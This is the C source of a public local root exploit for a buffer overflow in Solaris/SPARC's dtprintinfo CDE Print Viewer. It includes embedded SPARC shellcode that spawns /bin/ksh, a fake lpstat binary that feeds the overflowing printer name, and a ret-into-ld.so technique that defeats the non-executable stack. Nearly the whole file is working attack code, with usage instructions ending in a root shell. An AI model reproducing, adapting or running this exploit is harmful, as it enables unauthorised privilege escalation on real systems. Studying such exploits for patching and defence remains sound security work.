/*
 * raptor_dtprintname_sparc2.c - dtprintinfo 0day, Solaris/SPARC
 * Copyright (c) 2004-2019 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * 0day buffer overflow in the dtprintinfo(1) CDE Print Viewer, leading to
 * local root. Many thanks to Dave Aitel for discovering this vulnerability
 * and for his interesting research activities on Solaris/SPARC.
 *
 * "None of my dtprintinfo work is public, other than that 0day pack being
 * leaked to all hell and back. It should all basically still work. Let's
 * keep it that way, cool? :>" -- Dave Aitel
 *
 * This is the ret-into-ld.so version of raptor_dtprintname_sparc.c, able 
 * to bypass the non-executable stack protection (noexec_user_stack=1 in 
 * /etc/system).
 *
 * NOTE. If experiencing troubles with null-bytes inside the ld.so.1 memory 
 * space, use sprintf() instead of strcpy() (tested on some Solaris 7 boxes).
 *
 * Usage:
 * $ gcc raptor_dtprintname_sparc2.c -o raptor_dtprintname_sparc2 -ldl -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintname_sparc2 192.168.1.1:0
 * [...]
 * # id
 * uid=0(root) gid=10(staff)
 * #
 *
 * Tested on:
 * SunOS 5.7 Generic_106541-21 sun4u sparc SUNW,Ultra-1
 * SunOS 5.8 Generic_108528-13 sun4u sparc SUNW,Ultra-5_10
 * SunOS 5.9 Generic sun4u sparc SUNW,Ultra-5_10
 * [SunOS 5.10 is also vulnerable, the exploit might require some tweaking]
 */

#include <dlfcn.h>
#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintname_sparc2.c - dtprintinfo 0day, Solaris/SPARC"
#define INFO2	"Copyright (c) 2004-2019 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtprintinfo"	// the vulnerable program
#define	BUFSIZE	301				// size of the printer name
#define	FFSIZE	64 + 1				// size of the fake frame
#define	DUMMY	0xdeadbeef			// dummy memory address

/* voodoo macros */
#define	VOODOO32(_,__,___)	{_--;_+=(__+___-1)%4-_%4<0?8-_%4:4-_%4;}
#define	VOODOO64(_,__,___)	{_+=7-(_+(__+___+1)*4+3)%8;}

char sc[] = /* Solaris/SPARC shellcode (12 + 12 + 48 = 72 bytes) */
/* double setuid() */
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
/* execve() */
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], ff[FFSIZE], ret_var[16], fpt_var[16];
	char	platform[256], release[256], display[256];
	int	i, offset, ff_addr, sc_addr, ret_pos, fpt_pos;
	int	plat_len, prog_len, rel;

	char	*arg[2] = {"foo", NULL};
	int	arg_len = 4, arg_pos = 1;

	int	sb = ((int)argv[0] | 0xffff) & 0xfffffffc;
	int	ret = search_ldso("strcpy");	/* or sprintf */
	int	rwx_mem = search_rwx_mem();

	/* fake lpstat code */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* get ret and fake frame addresses from environment */
		ret = (int)strtoul(getenv("RET"), (char **)NULL, 0);
		ff_addr = (int)strtoul(getenv("FPT"), (char **)NULL, 0);

		/* prepare the evil printer name */
		memset(buf, 'A', sizeof(buf));
		buf[sizeof(buf) - 1] = 0x0;

		/* fill with return and fake frame addresses */
		for (i = 0; i < BUFSIZE; i += 4) {
			/* apparently, we don't need to bruteforce */
			set_val(buf, i, ret - 4);
			set_val(buf, i += 4, ff_addr);
		}

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for %s: /dev/null\n", buf);
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: %s\n", buf);
		}
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	rel = atoi(release + 2);

	/* prepare the fake frame */
	bzero(ff, sizeof(ff));

	/*
	 * saved %l registers
	 */
	set_val(ff, i  = 0, DUMMY);		/* %l0 */
	set_val(ff, i += 4, DUMMY);		/* %l1 */
	set_val(ff, i += 4, DUMMY);		/* %l2 */
	set_val(ff, i += 4, DUMMY);		/* %l3 */
	set_val(ff, i += 4, DUMMY);		/* %l4 */
	set_val(ff, i += 4, DUMMY);		/* %l5 */
	set_val(ff, i += 4, DUMMY);		/* %l6 */
	set_val(ff, i += 4, DUMMY);		/* %l7 */

	/*
	 * saved %i registers
	 */
	set_val(ff, i += 4, rwx_mem);		/* %i0: 1st arg to strcpy() */
	set_val(ff, i += 4, 0x42424242);	/* %i1: 2nd arg to strcpy() */
	set_val(ff, i += 4, DUMMY);		/* %i2 */
	set_val(ff, i += 4, DUMMY);		/* %i3 */
	set_val(ff, i += 4, DUMMY);		/* %i4 */
	set_val(ff, i += 4, DUMMY);		/* %i5 */
	set_val(ff, i += 4, sb - 1000);		/* %i6: frame pointer */
	set_val(ff, i += 4, rwx_mem - 8);	/* %i7: return address */

	/* fill the envp, keeping padding */
	sc_addr = add_env(ff);
	add_env(sc);
	ret_pos = env_pos;
	add_env("RET=0x41414141");
	fpt_pos = env_pos;
	add_env("FPT=0x42424242");
	add_env(display);
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the offset to argv[0] (voodoo magic) */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = arg_len + env_len + plat_len + prog_len;
	if (rel > 7)
		VOODOO64(offset, arg_pos, env_pos)
	else
		VOODOO32(offset, plat_len, prog_len)

	/* calculate the needed addresses */
	ff_addr = sb - offset + arg_len;
	sc_addr += ff_addr;

	/* set fake frame's %i1 */
	set_val(ff, 36, sc_addr);		/* 2nd arg to strcpy() */

	/* overwrite RET and FPT env vars with the right addresses */
	sprintf(ret_var, "RET=0x%x", ret);
	env[ret_pos] = ret_var;
	sprintf(fpt_var, "FPT=0x%x", ff_addr);
	env[fpt_pos] = fpt_var;

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using ff address\t: 0x%p\n", (void *)ff_addr);
	fprintf(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return(env_len);
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return(env_len);
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "Error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return(addr);
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address NULL bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return(addr_old);
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}
